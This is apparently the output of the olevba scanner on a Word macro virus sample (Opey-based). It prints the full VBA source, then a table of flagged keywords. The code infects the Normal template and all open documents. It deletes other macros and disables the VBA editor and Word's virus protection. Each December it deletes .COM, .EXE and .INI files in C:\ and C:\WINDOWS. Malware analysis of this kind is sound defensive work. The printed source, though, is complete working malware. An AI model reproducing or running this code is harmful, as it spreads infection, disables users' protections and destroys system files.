olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-a57a42a8d487aa4d8ef3bf66a36ae25775f99591
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-a57a42a8d487aa4d8ef3bf66a36ae25775f99591 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sigma.bas 
in file: Virus.MSWord.Opey-based-a57a42a8d487aa4d8ef3bf66a36ae25775f99591 - OLE stream: 'Macros/VBA/Sigma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright(c) 2000 Puerto Princesa City.
Sub AutoOpen()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileSave()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call clascopy
End Sub
Sub clascopy()
    On Error Resume Next
    Call stealth
    infected = False
    For A_A = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        modname = NormalTemplate.VBProject.VBComponents(A_A).Name
        If modname = "Sigma" Then infected = True
        If (modname <> "Sigma") And (modname <> "ThisDocument") Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
        End If
    Next A_A
    For Each DocumentOpen In Documents
        Docinfected = False
        With DocumentOpen
            For Sigmaclaw = DocumentOpen.VBProject.VBComponents.Count To 1 Step -1
                modname = DocumentOpen.VBProject.VBComponents(Sigmaclaw).Name
                If modname = "Sigma" Then Docinfected = True
                If (modname <> "Sigma") And (modname <> "ThisDocument") And (modname <> "Reference to Normal") Then
                    Application.OrganizerDelete Source:=DocumentOpen.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                End If
            Next Sigmaclaw
            If Docinfected = False Then
                e = NormalTemplate.VBProject.VBComponents(2).CodeModule.CountOfLines
                vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                DocumentOpen.VBProject.VBComponents.Add(1).Name = "Sigma"
                DocumentOpen.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
            End If
        End With
    Next DocumentOpen
    If infected = False Then
        e = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
        vircode = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, e)
        NormalTemplate.VBProject.VBComponents.Add(1).Name = "Sigma"
        NormalTemplate.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
        NormalTemplate.Save
    End If
End Sub
Sub stealth()
    On Error Resume Next
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyBreak, wdKeyCtrl)).Disable
    CommandBars("tools").Reset
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    ActiveDocument.ReadOnlyRecommended = False
    With Dialogs(wdDialogFileSummaryInfo)
        .Title = "Datu lamang!"
        .Author = "???????"
        .Comments = "Puerto Princesa - the cleanest & greenest city in the PHILIPPINES"
        .Execute
    End With
    If Month(Date) = 12 Then
        Kill "C:\*.COM"
        Kill "C:\WINDOWS\*.INI"
        Kill "C:\WINDOWS\*.COM"
        Kill "C:\WINDOWS\*.EXE"
    End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |DocumentOpen        |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

